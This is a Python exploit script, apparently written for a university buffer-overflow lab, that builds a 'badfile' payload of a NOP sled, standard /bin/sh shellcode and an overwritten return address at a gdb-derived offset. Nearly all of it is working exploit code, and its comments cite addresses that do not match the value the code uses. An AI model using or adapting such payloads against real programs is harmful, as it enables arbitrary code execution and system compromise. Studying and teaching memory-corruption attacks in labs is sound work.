#!/usr/bin/python3
import sys

# Based on CS363 lecture slides (Page 27)
# This is shellcode that executes /bin/sh
# It's a standard, well-known example.
shellcode = (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOPs (0x90)
# We're creating a 300-byte payload, as read by main()
content = bytearray(0x90 for i in range(300))

# --- Calculate Shellcode Placement ---
# Put the shellcode at the very end of the 300-byte block
start = 300 - len(shellcode)
content[start:] = shellcode

# --- Calculate Return Address ---
# This address needs to point somewhere in our NOP sled.
# We found our buffer starts at 0xbfffea8c (from gdb).
# Let's guess an address somewhere in the middle of our buffer/NOP sled.
# An address like 0xbfffead8 (which is 0xbfffea8c + 172) is a good guess.
# We'll add a bit more (e.g., + 120) to try and land in the NOP sled.
# This value may require a little tuning!
ret = 0xffffcdc8 + 120 

# --- Define the Offset ---
# This is the magic number we calculated in gdb
# (ebp - buffer) + 4 = 112
offset = 112

# --- Build the Payload ---
# Place the new return address at the correct offset
# We use (ret).to_bytes to convert the integer address into little-endian bytes
content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)